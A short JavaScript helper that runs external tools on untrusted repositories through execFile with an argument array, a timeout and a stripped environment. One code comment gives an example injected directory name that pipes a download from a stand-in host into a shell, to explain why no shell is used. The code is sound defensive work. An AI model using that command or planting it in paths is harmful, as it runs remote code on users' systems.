import { execFile } from "child_process";

// Always execFile with an argument array: paths come from repos we don't control,
// and a shell would happily run a directory named `$(curl evil | sh)`.
// Tools get a minimal environment so they never see our own secrets.
export const runTool = (bin, args, { timeout = 120000, cwd, home } = {}) => new Promise((resolve) => {
    execFile(bin, args, {
        cwd,
        timeout,
        killSignal: 'SIGKILL',
        maxBuffer: 64 * 1024 * 1024,
        env: { PATH: process.env.PATH, HOME: home || process.env.HOME, NO_COLOR: '1' },
    }, (error, stdout, stderr) => {
        resolve({ error, stdout: stdout || '', stderr: stderr || '', timedOut: Boolean(error?.killed) })
    })
})
